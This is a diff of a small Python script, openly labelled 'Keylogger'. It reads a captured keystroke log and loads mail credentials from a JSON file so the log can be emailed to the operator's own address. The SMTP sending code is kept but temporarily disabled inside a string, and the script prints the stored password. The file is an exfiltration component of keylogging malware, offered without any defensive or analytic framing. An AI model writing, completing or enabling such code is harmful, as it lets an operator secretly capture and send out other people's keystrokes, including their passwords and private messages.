@@ -1,16 +1,30 @@
-import smtplib
-from email.mime.text import MIMEText
+# import smtplib
+# from email.mime.text import MIMEText
+import json
 
 # Define your email parameters
-sender = 'your_email_address'
-password = 'your_email_password'
-recipient = 'recipient_email_address'
+sender = ""
+password = ""
+recipient = ""
 subject = "Keylogger"
-message = 'Body of your email'
+message = ""
 
-# Create a MIMEText object with your message
-msg = MIMEText(message)
+# Get the contents of log.txt
+with open("log.txt", "r") as txtFile:
+    message = txtFile.read()
 
+with open("info.json", "r") as jsonFile:
+    data = json.load(jsonFile)
+    sender = data["sender/recipient"]
+    password = data["password"]
+    recipient = sender
+
+print(sender)
+print(password)
+print(recipient)
+print(message)
+
+"""
 # Set the sender, recipient, and subject of the email
 msg['From'] = sender
 msg['To'] = recipient
@@ -28,3 +42,4 @@ server.sendmail(sender, recipient, msg.as_string())
 
 # Close the SMTP server connection
 server.quit()
+"""
